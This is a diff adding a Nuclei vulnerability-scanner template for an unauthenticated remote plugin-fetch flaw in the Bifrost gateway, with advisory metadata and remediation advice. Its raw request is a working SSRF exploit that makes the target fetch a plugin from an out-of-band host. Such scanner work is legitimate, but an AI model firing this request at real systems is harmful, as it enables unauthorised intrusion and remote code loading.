@@ -1,0 +1,39 @@
+id: CVE-2026-86242
+
+info:
+  name: Bifrost < 1.6.3 - Unauthenticated Remote Plugin URL Fetch
+  author: alex700
+  severity: high
+  description: |
+    When dashboard authentication is disabled, Bifrost accepts an enabled custom plugin with an HTTP URL as its path. The gateway fetches the URL before attempting to load it. This template confirms the unauthenticated server-side request with an out-of-band callback; it does not assert code execution on statically linked builds.
+  impact: |
+    An unauthenticated network caller can cause the gateway to make outbound HTTP requests. Dynamically linked builds that can load a compatible Go plugin may permit code execution.
+  remediation: |
+    Upgrade Bifrost to a release that requires genuine admin authentication for custom plugin paths, such as transports v2.1.0 or later, and enable dashboard authentication.
+  reference:
+    - https://github.com/maximhq/bifrost/security/advisories/GHSA-2qp8-4xgm-fw6g
+  classification:
+    cve-id: CVE-2026-86242
+    cwe-id: CWE-918
+  metadata:
+    max-request: 1
+    vendor: maximhq
+    product: bifrost
+  tags: cve,cve2026,bifrost,ssrf,oast,intrusive
+
+variables:
+  plugin_name: "nuclei_{{rand_text_alpha(10)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/plugins HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name":"{{plugin_name}}","enabled":true,"path":"http://{{interactsh-url}}/bifrost-86242"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500 && contains(body, "Plugin created in database but failed to load") && contains(interactsh_protocol, "http")'
